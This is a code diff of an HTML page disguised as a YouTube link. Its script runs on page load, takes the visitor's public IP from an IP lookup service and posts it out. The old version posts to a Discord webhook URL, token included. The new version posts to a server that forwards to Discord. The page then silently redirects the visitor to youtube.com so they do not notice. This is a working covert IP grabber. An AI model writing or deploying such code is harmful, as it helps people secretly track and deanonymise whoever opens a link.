@@ -2,41 +2,41 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>youtube.com/@axifn7</title>
+  <title>youtube</title>
 </head>
 <body>
 
-  <script>
-    // ============ CONFIG ============
-    const REDIRECT_LINK = "https://www.youtube.com";
-    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1466362286951104643/Jsm9HpSe-2vh2eDLjFcoQLdug_4Fe-iOd5rSCNWIZPVGdisDj_gZl9M9fH_yWErJVwph";
-    const IP_API = "https://api.ipify.org?format=json";
-    // ================================
+<script>
+  // ============ CONFIG ============
+  const REDIRECT_LINK = "https://www.youtube.com";
+  const IP_API = "https://api.ipify.org?format=json";
+  const SERVER_URL = "http://localhost:3000/send-ip"; // your server URL
+  // ================================
 
-    async function run() {
-      try {
-        // Get fake ip
-        const res = await fetch(IP_API);
-        const data = await res.json();
-        const ip = data.ip;
+  async function run() {
+    try {
+      // Get public IP
+      const res = await fetch(IP_API);
+      const data = await res.json();
+      const ip = data.ip;
 
-        // Send to Discord
-        await fetch(DISCORD_WEBHOOK, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            username: "IP Test",
-            content: `Public IP: \`${ip}\``
-          })
-        });
+      // Send to our server (which forwards to Discord)
+      await fetch(SERVER_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ ip })
+      });
 
-      } catch (err) {
-        console.error("Error:", err);
-      }
+    } catch (err) {
+      console.error("Error:", err);
+    }
 
-      // Redirect (always happens)
-      window.location.href = REDIRECT_LINK;
-    });
-  </script>
+    // Redirect after sending
+    window.location.href = REDIRECT_LINK;
+  }
+
+  run();
+</script>
+
 </body>
 </html>
